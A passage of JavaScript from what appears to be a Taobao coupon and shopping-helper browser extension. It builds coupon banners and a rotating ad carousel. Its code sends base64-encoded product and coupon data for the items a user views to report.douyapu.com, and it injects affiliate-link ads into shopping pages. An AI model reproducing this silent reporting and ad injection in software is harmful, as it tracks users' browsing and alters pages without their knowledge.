                                    shareUrl:"//uland.taobao.com/coupon/edetail?e=" + getParam(list.clickUrl,"e"),
                                    comment:goodRate,
                                    source:pintai,
                                    startFee:aliData ? aliData.startFee : "",
                                    amount:list.couponAmount / 100,
                                    totalCount:res.couponTotalCount,
                                    leftCount:res.couponLeftCount,
                                    biz30Day:aliData ? aliData.item.biz30Day : list.uvsum,
                                };
                            }
                            var base64Post = '';
                            $.each(postData,function (v,k) {
                                if (v == "rate") {
                                    $.each(k,function (m,n) {
                                        if (n) {
                                            base64Post += `${Base64.encode(n)}|`
                                        } else {
                                            base64Post += `-|`
                                        }
                                    })
                                } else {
                                    if (k || k == 0) {
                                        base64Post += `${Base64.encode(k)}|`
                                    } else {
                                        base64Post += `-|`
                                    }
                                }
                            });
                            // console.log(postData);
                            base64Post = base64Post.replace(/\|$/gi,"");
                            if ((!sessionStorage.moguControl || sessionStorage.moguControl != sj_id)) {
                                chrome.extension.sendMessage({
                                    name:"universal",
                                    url:"http://report.douyapu.com/api/cp",
                                    type:"post",
                                    data:{
                                        data:base64Post,
                                        action:action
                                    }
                                },function () {
                                });
                                sessionStorage.moguControl = sj_id;
                            }
                        }   //
                    }   //上传优惠券数据
                    chrome.storage.local.get(null,function (local) {
                        hasPostArr = local.postCou180711 ? local.postCou180711 : [];
                        if (list) {
                            //有优惠券判断是否本地是否有ID 如果无ID就把ID存进postCou180711     并上报优惠券信息
                            var postSwi = 1;
                            $.each(hasPostArr,function (v,k) {
                                if (k.id == sj_id) {
                                    postSwi = 0;
                                    return false;
                                }
                            });
                            if (postSwi) {
                                if (hasPostArr.length > 99) {
                                    hasPostArr.shift();
                                }
                                hasPostArr.push({id:sj_id,time:new Date().getTime()});
                                chrome.storage.local.set({postCou180711:hasPostArr},function () {
                                    delTime();
                                });
                            } else {
                                delTime();
                            }
                            getDan(myPostMmId,page2,getH5CouNum2,postCou);
                        } else {
                            //无优惠券判断是否本地是否有ID 如果有ID就要上报无优惠券信息
                            var needPost = 0;
                            var index = 0;
                            $.each(hasPostArr,function (v,k) {
                                if (k.id == sj_id) {
                                    index = v;
                                    needPost = 1;
                                    return false;
                                }
                            });
                            if (needPost) {
                                hasPostArr.splice(index,1);
                                chrome.storage.local.set({postCou180711:hasPostArr});
                                postCou(0,"no");
                            }
                        }
                    });
                }                //上报优惠券
                getDan(myMmId,page,getH5CouNum,setCoupon);
            }
        }();                                       //中间优惠券模块2
        !function () {
            var data = [
                {name:'618活动',title:'季末大放送 , 爆款低价',pic:'http://file.douyapu.com/douyapu/dai360/2018618.png',clickE:"酷girl",type:0,url:"https://s.click.taobao.com/ySoCNOw"}
            ];
            var html = '';
            $.each(data,function (v,k) {
                html += `<li class="plugMid627-rollAd-item${v}">
                    <span data-mgClick="${k.clickE}">${k.title}</span>
                </li>`;
                $(".plugMid627-rollAd").on('click',`.plugMid627-rollAd-item${v} span`,function () {
                    // $(".plugFix627-close").attr("data-mgClick",`${k.name}关闭`);
                    if (k.type) {
                        $(".plugFix627-box img").attr("src",k.pic);
                        $("#plugFix627").css("display","block");
                    } else {
                        openWindow(k.url)
                    }
                })
            });
            $(".plugMid627-rollAd ul").html(html);
            $(".plugMid627-rollAd li:eq(0)").clone(true).appendTo($(".plugMid627-rollAd ul"));
            var liHeight = $(".plugMid627-rollAd").height();
            var totalHeight = ($(".plugMid627-rollAd li").length * $(".plugMid627-rollAd li").eq(0).height()) - liHeight;
            $(".plugMid627-rollAd ul").height(totalHeight);
            var index = 0;
            var autoTimer = 0;
            var clickEndFlag = true;    //
            function tab() {
                $(".plugMid627-rollAd ul").stop().animate({
                    top:-index * liHeight
                },400,function () {
                    clickEndFlag = true;
                    if (index == $(".plugMid627-rollAd li").length - 1) {
                        $(".plugMid627-rollAd ul").css({top:0});
                        index = 0;
                    }
                })
            }        //
            function next() {
                index++;
                if (index > $(".plugMid627-rollAd li").length - 1) {
                    index = 0;
                }
                tab();
            }       //
            autoTimer = setInterval(next,2000); //
            $(".plugMid627-rollAd ul li").hover(function () {
                clearInterval(autoTimer);
            },function () {
                autoTimer = setInterval(next,2000);
            }); //轮播逻辑代码
            var fixHtml = `<div id="plugFix627">
                <div class="plugFix627-shadow"></div>
                <div class="plugFix627-box">
                    <img src="http://file.douyapu.com/douyapu/dai360/dati423.png">
                    <div class="plugFix627-close"></div>
                </div>
            </div>`;
            $('body').append(fixHtml);
            // $("body").on("click","#dai360_link",function () {
            //     openWindow("https://temai.taobao.com/event2549927.htm?q=zIZJi72DTCHzX1yJ4zwwtqtujjtJViRVKKPwiwsBZjTrHEPWRherKw35rLQv0%2BddsBnxIH1nzuATT7r2KojiYg%3D%3D")
            // });
            $("#plugFix627").on("click",".plugFix627-shadow",function () {
                $("#plugFix627").css("display","none");
            });
            $("#plugFix627").on("click",".plugFix627-close",function () {
                $("#plugFix627").css("display","none");
            });
        }();                                       //下面轮播活动模块3
    }           //淘宝客业务页面
    function startAllUrl() {
        // cnzzAppend(function () {});
        !function () {
            var total;
            var locHost = location.host;
            var sj_title = $("head>title").length ? $("head>title").html().replace(/-淘宝网|-tmall.com天猫$/,"") : "";
            chrome.storage.local.get(null,function () {
                var n = 0;
                var dypAlert = [
                    {
                        "id":1,
                        "name":"空调专题",
                        "desc":"空调专题",
                        "link":"https://p.gouwubang.com/c?w=845205&c=17532&i=41052&pf=y&e=c&t=https://cuxiao.suning.com/ktknkh.html?utm_source=khd001&utm_medium=tubiao",
                        "img_src":"data:image/png;base64,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